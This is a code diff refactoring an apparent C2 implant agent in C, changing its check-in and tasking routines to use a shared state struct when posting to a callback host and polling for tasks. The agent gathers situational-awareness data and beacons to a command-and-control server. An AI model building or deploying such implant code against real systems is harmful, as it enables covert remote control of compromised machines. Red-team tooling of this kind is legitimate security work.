@@ -113,21 +113,21 @@ void free_checkin_reply(CheckinReply *reply) {
 	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
 }
 
-void perform_checkin(AgentParams *params, AgentCapabilities *cap, HttpHandle *http, CheckinReply *reply) {
+void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *reply) {
 	// Generate checkin payload.
 	CheckinRequest checkin = { 0 };
-	checkin.payload_uuid = clone_str(params->payload_uuid);
+	checkin.payload_uuid = clone_str(state->params.payload_uuid);
 	
 	// Use the checkin PICO to gather basic situational awareness info, if possible.
 	cap->CheckinPicoEntrypoint(&checkin);
 	
 	// Send checkin payload to C2 server.
 	char *msg = generate_checkin_message(&checkin);
-	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
+	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
 	HttpBody body = {msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
-	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
 	
 	// If we get a 200 response code, parse the reply.
 	if (response.status_code == 200) {
@@ -221,19 +221,19 @@ void free_tasking_reply(TaskingReply *reply) {
 	}
 }
 
-void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply) {
+void perform_tasking(AgentState *state, TaskingReply *reply) {
 	// Generate tasking payload.
 	TaskingRequest tasking = { 0 };
-	tasking.callback_uuid = clone_str(params->callback_uuid);
+	tasking.callback_uuid = clone_str(state->params.callback_uuid);
 	tasking.tasking_size = 1;
 	char *msg = generate_tasking_message(&tasking);
 	
 	// Send tasking payload to C2 server.
-	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
+	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
 	HttpBody body = {msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
-	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
 	
 	// If we get a 200 response code, parse the reply.
 	if (response.status_code == 200) {
@@ -246,3 +246,9 @@ void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply)
 	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
 }
+
+/*
+ *
+ * POST LOGIC
+ *
+*/
